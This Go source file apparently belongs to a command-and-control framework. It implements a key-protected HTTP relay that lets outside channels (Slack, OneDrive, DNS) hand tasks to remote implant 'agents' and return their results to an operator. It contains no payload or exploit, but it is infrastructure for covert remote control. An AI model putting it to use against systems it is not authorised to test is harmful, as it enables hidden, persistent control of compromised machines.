package server

// ext_c2.go — External C2 relay listener.
//
// Exposes a lightweight HTTP relay on a dedicated port that an external
// "channel" (Slack bot, OneDrive poller, DNS stub, etc.) can poll to
// deliver tasks to agents and return results — without the channel ever
// touching the operator API or the agent transport directly.
//
// Endpoints (all require X-ExternalC2-Key: <secret>):
//   GET  /ext/{agentID}/task    → next pending task JSON (204 if none)
//   POST /ext/{agentID}/result  → submit a task result (plaintext JSON)
//   GET  /ext/{agentID}/ping    → update last_seen, return 200

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// StartExtC2 starts an External C2 relay listener.
func (s *Server) StartExtC2(port int, secret string) (int, error) {
	mux := http.NewServeMux()
	mux.HandleFunc("/ext/", s.extC2Auth(secret, s.handleExtC2))
	srv := &http.Server{
		Addr:         fmt.Sprintf(":%d", port),
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
	}
	job := s.addJob("ExtC2", port)
	s.mu.Lock()
	s.jobSrvs[job.ID] = srv
	s.mu.Unlock()
	go func() {
		s.printf("[*] External C2 relay on :%d  (job #%d)\n", port, job.ID)
		if err := srv.ListenAndServe(); err != http.ErrServerClosed {
			s.stopJob(job.ID)
		}
	}()
	return job.ID, nil
}

func (s *Server) extC2Auth(secret string, next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-ExternalC2-Key") != secret {
			http.Error(w, "forbidden", http.StatusForbidden)
			return
		}
		next(w, r)
	}
}

// URL format: /ext/{agentID}/{action}
func (s *Server) handleExtC2(w http.ResponseWriter, r *http.Request) {
	parts := strings.SplitN(strings.TrimPrefix(r.URL.Path, "/ext/"), "/", 2)
	if len(parts) < 2 {
		http.Error(w, "usage: /ext/{agentID}/{task|result|ping}", http.StatusBadRequest)
		return
	}
	agentID, action := parts[0], parts[1]

	agent, err := s.db.GetAgent(agentID)
	if err != nil || !agent.Active {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	switch action {
	case "ping":
		s.db.TouchAgent(agentID)
		w.WriteHeader(http.StatusOK)

	case "task":
		if r.Method != http.MethodGet {
			http.Error(w, "GET required", http.StatusMethodNotAllowed)
			return
		}
		s.db.TouchAgent(agentID)
		tasks, err := s.db.PendingTasks(agentID)
		if err != nil || len(tasks) == 0 {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		// Return first pending task as plain JSON (no encryption — channel is responsible)
		t := tasks[0]
		s.db.MarkTaskFetched(t.ID)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{
			"id":   t.ID,
			"type": t.Type,
			"args": t.Args,
		})

	case "result":
		if r.Method != http.MethodPost {
			http.Error(w, "POST required", http.StatusMethodNotAllowed)
			return
		}
		body, _ := io.ReadAll(io.LimitReader(r.Body, 1024*1024))
		var req struct {
			TaskID int64  `json:"task_id"`
			Output string `json:"output"`
			Error  string `json:"error,omitempty"`
		}
		if err := json.Unmarshal(body, &req); err != nil {
			http.Error(w, "bad json", http.StatusBadRequest)
			return
		}
		s.db.InsertResult(req.TaskID, agentID, req.Output, req.Error)
		w.WriteHeader(http.StatusOK)
		if req.Output != "" {
			BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d complete (ext-c2)", req.TaskID))
		}

	default:
		http.Error(w, "unknown action: use task, result, or ping", http.StatusNotFound)
	}
}
